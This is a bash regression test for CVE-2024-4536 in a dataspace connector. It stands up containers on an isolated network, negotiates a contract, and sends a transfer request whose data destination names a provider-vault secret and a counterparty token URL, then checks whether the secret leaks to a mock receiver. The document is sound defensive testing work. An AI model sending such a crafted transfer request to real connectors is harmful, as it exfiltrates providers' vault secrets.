#!/usr/bin/env bash
# CVE-2024-4536 regression test, DSP-driven (D7a). A consumer connector (iam-mock) negotiates a
# contract with the provider over DSP, then requests a PUSH transfer whose dataDestination
# (counterparty-controlled) is an OAuth2 HttpData sink naming a provider-vault secret
# (clientSecretKey) and a counterparty tokenUrl. 0.6.2 (sink OAuth2 decorator present) resolves
# the named secret from the PROVIDER vault and posts it to the counterparty tokenUrl -> leak.
# 0.6.3 removed the sink decorator -> no leak (positive control: the sink write still happens).
# Oracle (receiver/API evidence only): FAIL = receiver POST /token and/or canary captured;
# PASS = sink write seen with no token POST / no canary; else INVALID. Canary value never stored.
# Usage: ./42_test_4536_dsp.sh <edc-version>
case $- in *x*) echo "refusing to run under -x (would trace the canary value)"; exit 1;; esac
source "$(dirname "$0")/lib.sh"   # set -euo pipefail, require_docker, COMMIT, JQ, DRIVER_IMG
redact() { sed "s/$CANARY/<redacted>/g"; }
V="${1:?usage: 42_test_4536_dsp.sh <edc-version>}"
IMG="gradle@sha256:963d59f7f22767da4efbcf46b661361b61af5fb88b0309da1071c4234c647eba"
NET="pilot08v"; ALIAS="pilot08-canary"; DSPP="dataspace-protocol-http"
EDCNS="https://w3id.org/edc/v0.0.1/ns/"; DRV="$DRIVER_IMG"
case "$V" in 0.6*) PV=v2 ;; *) PV=v3 ;; esac   # policy/cd/catalog/negotiation/transfer/dataplanes version
PK="pilot08-provider-mgmt"; CK="pilot08-consumer-mgmt"; ASSET="asset-4536"
jar="$PILOT/testbed/launcher/build/libs/pilot08-edc-$V.jar"
[ -f "$jar" ] || { echo "no jar for $V — build it first"; exit 1; }
sha="$(sha256sum "$jar" | cut -d' ' -f1)"
# L5: the jar must be recorded at a CLEAN (non -dirty) commit — a 7-hex commit field.
grep -qE "^$V,$sha,[0-9]+,[0-9a-f]{7}," "$PILOT/env/vanilla-jars.csv" 2>/dev/null || { echo "jar sha $sha for $V not recorded at a clean commit — rebuild on a clean tree"; exit 1; }
CANARY="pilot08-canary-$(head -c 16 /dev/urandom | od -An -tx1 | tr -d ' \n')"
trap 'docker rm -f pilot08v-provider pilot08v-consumer pilot08v-receiver >/dev/null 2>&1 || true' EXIT

docker network inspect "$NET" >/dev/null 2>&1 || docker network create --internal "$NET" >/dev/null
[ "$(docker network inspect "$NET" --format '{{.Internal}}')" = true ] || { echo "network $NET not internal"; exit 1; }
docker rm -f pilot08v-provider pilot08v-consumer pilot08v-receiver >/dev/null 2>&1
# Receiver: a concurrent JDK HttpServer (not a single-shot `nc` loop, which dropped the sink write
# that arrives after the source GET / token POST). Logs every request to /cap.txt, replies 200.
run="$PILOT/build/run"; mkdir -p "$run/p" "$run/c" "$run/r"
cp "$PILOT/testbed/receiver/Receiver.java" "$run/r/Receiver.java"
MSYS_NO_PATHCONV=1 docker run -d --name pilot08v-receiver --network "$NET" --network-alias receiver \
  -v "$run/r":/work -w /work "$IMG" java /work/Receiver.java >/dev/null
for _ in $(seq 1 60); do docker logs pilot08v-receiver 2>&1 | grep -q 'receiver-ready' && break; sleep 1; done

cp "$jar" "$run/p/app.jar"; cp "$PILOT/testbed/launcher/config/provider.properties" "$run/p/"
cp "$jar" "$run/c/app.jar"; cp "$PILOT/testbed/launcher/config/consumer.properties" "$run/c/"
MSYS_NO_PATHCONV=1 docker run -d --name pilot08v-provider --network "$NET" --network-alias provider -v "$run/p":/work -w /work "$IMG" \
  java -Dedc.fs.config=/work/provider.properties -Dpilot08.canary.alias="$ALIAS" -Dpilot08.canary.value="$CANARY" -jar /work/app.jar >/dev/null
MSYS_NO_PATHCONV=1 docker run -d --name pilot08v-consumer --network "$NET" --network-alias consumer -v "$run/c":/work -w /work "$IMG" \
  java -Dedc.fs.config=/work/consumer.properties -jar /work/app.jar >/dev/null
for n in provider consumer; do for _ in $(seq 1 60); do docker logs "pilot08v-$n" 2>&1 | grep -q ' ready' && break; sleep 2; done; done
seeded=no; docker logs pilot08v-provider 2>&1 | grep -q 'seeded canary secret' && seeded=yes

req() { docker run --rm --network "$NET" "$DRV" -s -w '\nHTTPCODE:%{http_code}' --max-time 25 "$@" 2>/dev/null || true; }
# abort-proof: always emit a code (000 when the call produced no response) so set -e/pipefail
# never kills the script mid-flow and a real reason is always recorded.
code() { local c; c="$(printf '%s' "$1" | grep -oaE 'HTTPCODE:[0-9]+' | tail -1 | cut -d: -f2)"; echo "${c:-000}"; }
body() { printf '%s' "$1" | sed 's/HTTPCODE:[0-9]*$//'; }
# jfield <json> <plainkey> -> scalar value. Robust to: array-wrapped single resource,
# compact OR expanded ($EDCNS-prefixed) keys, [{"@value":…}] expansion, and jq failing to
# parse at all (e.g. invisible/control bytes in the HTTP body) — then a grep fallback runs.
# Keys are passed via --arg so no shell quoting leaks into the jq program.
jfield() {
  local v
  v="$(printf '%s' "$1" | "$JQ" -r --arg k "$2" --arg ns "$EDCNS" '
        (if type=="array" then .[0] else . end) as $o
        | ($o[$k] // $o[($ns+$k)] // empty)
        | (if type=="array" then (.[0]["@value"] // .[0]) else . end) // empty' 2>/dev/null || true)"
  [ -n "$v" ] && { printf '%s' "$v"; return 0; }
  # grep fallback; a missing key is a valid empty result, never an error (|| true so the
  # pipeline's exit 1 under set -e/pipefail can't abort the caller's "$(jfield …)" assignment).
  printf '%s' "$1" | grep -oE "\"([^\"]*[/#])?$2\":\"[^\"]*\"" | head -1 | sed -E 's/.*:"([^"]*)"$/\1/' || true
  return 0
}
hc() { docker run --rm --network "$NET" "$DRV" -s -o /dev/null -w '%{http_code}' --max-time 6 "http://$1:8080/api/check/health" 2>/dev/null || echo 000; }
phealth="$(hc provider)"; chealth="$(hc consumer)"
pstat="$(docker inspect pilot08v-provider --format '{{.State.Running}}/{{.State.ExitCode}}' 2>/dev/null || true)"
cstat="$(docker inspect pilot08v-consumer --format '{{.State.Running}}/{{.State.ExitCode}}' 2>/dev/null || true)"
echo "health: provider=$phealth consumer=$chealth; provider=$pstat consumer=$cstat"
pmgmt() { req -X POST "http://provider:8181/management/$1/$2" -H 'Content-Type: application/json' -H "X-Api-Key: $PK" -d "$3"; }
cmgmt() { req -X POST "http://consumer:8181/management/$1/$2" -H 'Content-Type: application/json' -H "X-Api-Key: $CK" -d "$3"; }
cget()  { req "http://consumer:8181/management/$1/$2" -H "X-Api-Key: $CK"; }
pget()  { req "http://provider:8181/management/$1/$2" -H "X-Api-Key: $PK"; }

r="$(pmgmt v3 assets '{"@context":{"@vocab":"'"$EDCNS"'"},"@id":"'"$ASSET"'","properties":{"name":"d"},"dataAddress":{"@type":"DataAddress","type":"HttpData","baseUrl":"http://receiver:9300/data"}}')"; seed_asset="$(code "$r")"
r="$(pmgmt "$PV" policydefinitions '{"@context":{"@vocab":"'"$EDCNS"'"},"@id":"pol-open","policy":{"@context":"http://www.w3.org/ns/odrl.jsonld","@type":"Set"}}')"; seed_policy="$(code "$r")"
r="$(pmgmt "$PV" contractdefinitions '{"@context":{"@vocab":"'"$EDCNS"'"},"@id":"cd-4536","accessPolicyId":"pol-open","contractPolicyId":"pol-open","assetsSelector":[]}')"; seed_cd="$(code "$r")"

# data plane: 0.6.x needs a manual registration (offer/transfer-type symmetry); 0.9.x self-registers.
dp_reg=no
if [ "$PV" = v2 ]; then
  r="$(pmgmt v2 dataplanes '{"@context":{"edc":"'"$EDCNS"'"},"@id":"dp-provider","edc:url":"http://provider:8383/control/transfer","edc:allowedSourceTypes":["HttpData"],"edc:allowedDestTypes":["HttpData"],"edc:allowedTransferTypes":["HttpData-PUSH"]}')"
  [ "$(code "$r")" = 200 ] && dp_reg=yes
else
  body "$(pget v3 dataplanes)" | "$JQ" -e '[.[]|.["allowedTransferTypes"]//[]]|flatten|index("HttpData-PUSH")' >/dev/null 2>&1 && dp_reg=self
fi

CATREQ='{"@context":{"@vocab":"'"$EDCNS"'"},"@type":"CatalogRequest","counterPartyAddress":"http://provider:8282/api/v1/dsp","protocol":"'"$DSPP"'"}'
rc="$(cmgmt "$PV" catalog/request "$CATREQ")"; cat_code="$(code "$rc")"; catbody="$(body "$rc")"
offer="$(printf '%s' "$catbody" | "$JQ" -r '[.["dcat:dataset"]]|flatten|.[]|select(.["@id"]=="'"$ASSET"'")|.["odrl:hasPolicy"]|if type=="array" then .[0] else . end|.["@id"]//empty' 2>/dev/null || true)"
push_offered=no; printf '%s' "$catbody" | grep -qF 'HttpData-PUSH' && push_offered=yes
echo "seed a=$seed_asset p=$seed_policy cd=$seed_cd ; dp_reg=$dp_reg ; catalog=$cat_code push_offered=$push_offered offer=${offer:0:28}" | redact

negId=""; agr=""; negstate=""; agr_on_provider=no; trId=""; tstate=""; terr=""
if [ -n "$offer" ]; then
  NEG='{"@context":{"@vocab":"'"$EDCNS"'"},"@type":"ContractRequest","counterPartyAddress":"http://provider:8282/api/v1/dsp","protocol":"'"$DSPP"'","policy":{"@context":"http://www.w3.org/ns/odrl.jsonld","@type":"Offer","@id":"'"$offer"'","assigner":"provider","target":"'"$ASSET"'"}}'
  rn="$(cmgmt "$PV" contractnegotiations "$NEG")"; negId="$(body "$rn" | "$JQ" -r '.["@id"]//empty' 2>/dev/null || true)"
  echo "neg POST code=$(code "$rn") negId=${negId:-none}"; [ -z "$negId" ] && echo "neg body: $(body "$rn" | head -c 200)" | redact
  for _ in $(seq 1 45); do st="$(body "$(cget "$PV" contractnegotiations/"$negId")")"; agr="$(jfield "$st" contractAgreementId)"; negstate="$(jfield "$st" state)"; case "$negstate" in FINALIZED|TERMINATED) break;; esac; sleep 2; done
  echo "neg final: state=[$negstate] agr=[${agr:0:8}]"
  # L1: the provider must have archived the agreement before the transfer, or processInitial terminates.
  if [ -n "$agr" ]; then for _ in $(seq 1 30); do [ "$(code "$(pget "$PV" contractagreements/"$agr")")" = 200 ] && { agr_on_provider=yes; break; }; sleep 2; done; fi
fi
if [ "$agr_on_provider" = yes ]; then
  TR='{"@context":{"@vocab":"'"$EDCNS"'"},"@type":"TransferRequest","counterPartyAddress":"http://provider:8282/api/v1/dsp","contractId":"'"$agr"'","assetId":"'"$ASSET"'","protocol":"'"$DSPP"'","transferType":"HttpData-PUSH","dataDestination":{"type":"HttpData","baseUrl":"http://receiver:9300/sink","oauth2:clientId":"consumer","oauth2:clientSecretKey":"'"$ALIAS"'","oauth2:tokenUrl":"http://receiver:9300/token"}}'
  rt="$(cmgmt "$PV" transferprocesses "$TR")"; trId="$(body "$rt" | "$JQ" -r '.["@id"]//empty' 2>/dev/null || true)"
  # Wait for a terminal state (COMPLETED/TERMINATED) OR for the receiver to actually log the sink
  # write — do NOT break on STARTED, because the PUSH to the sink happens as the transfer moves
  # STARTED -> COMPLETED, and stopping at STARTED can miss it (coordinator note on the first ladder).
  for _ in $(seq 1 60); do
    ts="$(body "$(cget "$PV" transferprocesses/"$trId")")"; tstate="$(jfield "$ts" state)"
    docker exec pilot08v-receiver sh -c 'grep -qiE "POST /sink|PUT /sink" /cap.txt 2>/dev/null' && break
    case "$tstate" in COMPLETED|TERMINATED) break;; esac
    sleep 2
  done
  terr="$(jfield "$ts" errorDetail)"   # recorded as an observation when the transfer failed
fi
sleep 6   # settle: let any in-flight data-plane push reach the receiver before reading /cap.txt
cap="$(docker exec pilot08v-receiver sh -c 'cat /cap.txt 2>/dev/null' 2>/dev/null || true)"
src_get=no;   printf '%s' "$cap" | grep -qiE 'GET /data|POST /data'  && src_get=yes || true
token_post=no;printf '%s' "$cap" | grep -qiE 'POST /token'       && token_post=yes || true
sink_write=no;printf '%s' "$cap" | grep -qiE 'POST /sink|PUT /sink'  && sink_write=yes || true
canary=no;    printf '%s' "$cap" | grep -qF "$CANARY"            && canary=yes || true
canary_in_log=no; docker logs pilot08v-provider 2>&1 | grep -qF "$CANARY" && canary_in_log=yes || true

leak=no; { [ "$token_post" = yes ] || [ "$canary" = yes ]; } && leak=yes
verdict=INVALID; reason=""
if [ "$seeded" != yes ]; then reason="canary-not-seeded"
elif [ "$canary_in_log" = yes ]; then reason="canary-in-provider-log"
elif [ -z "$offer" ]; then reason="no-offer[catalog=$cat_code]"
elif [ "$negstate" != FINALIZED ]; then reason="negotiation-not-finalized[$negstate]"
elif [ "$agr_on_provider" != yes ]; then reason="no-agreement-on-provider"
elif [ -z "$trId" ]; then reason="no-transfer-id"
elif [ "$src_get" != yes ]; then reason="source-not-read[state=$tstate]"
elif [ "$leak" = yes ]; then verdict=FAIL
elif [ "$sink_write" = yes ]; then verdict=PASS
else reason="sink-write-not-observed[positive-control-failed;state=$tstate;err=${terr:0:80}]"; fi

out="$PILOT/results/cve-2024-4536.csv"; mkdir -p "$PILOT/results"
[ -f "$out" ] || echo "edc_version,invariant,verdict,jar_sha256,commit" > "$out"
grep -v "^$V," "$out" > "$out.tmp" 2>/dev/null; mv "$out.tmp" "$out"
echo "$V,vault-scoping(CVE-2024-4536),$verdict,$sha,$COMMIT" >> "$out"
obs="$PILOT/env/cve-2024-4536-observations.csv"
hdr="edc_version,jar_sha256,commit,seed_asset,seed_policy,seed_cd,dp_reg,catalog,push_offered,offer,neg_state,agreement_on_provider,transfer_state,transfer_error,src_get,sink_write,token_post,canary_value,canary_in_log,verdict,invalid_reason"
terrsafe="$(printf '%s' "$terr" | redact | tr ',\n' ';;' | head -c 120)"
[ -f "$obs" ] || echo "$hdr" > "$obs"
grep -v "^$V," "$obs" > "$obs.tmp" 2>/dev/null; mv "$obs.tmp" "$obs"
echo "$V,$sha,$COMMIT,$seed_asset,$seed_policy,$seed_cd,$dp_reg,$cat_code,$push_offered,$([ -n "$offer" ] && echo yes||echo no),${negstate:-NA},$agr_on_provider,${tstate:-NA},${terrsafe:-NA},$src_get,$sink_write,$token_post,$canary,$canary_in_log,$verdict,$reason" >> "$obs"
echo "$V: dp=$dp_reg push_offered=$push_offered neg=$negstate agr_prov=$agr_on_provider tstate=${tstate:-NA} src_get=$src_get sink=$sink_write token=$token_post canary=$canary => $verdict ${reason:+[$reason]}" | redact
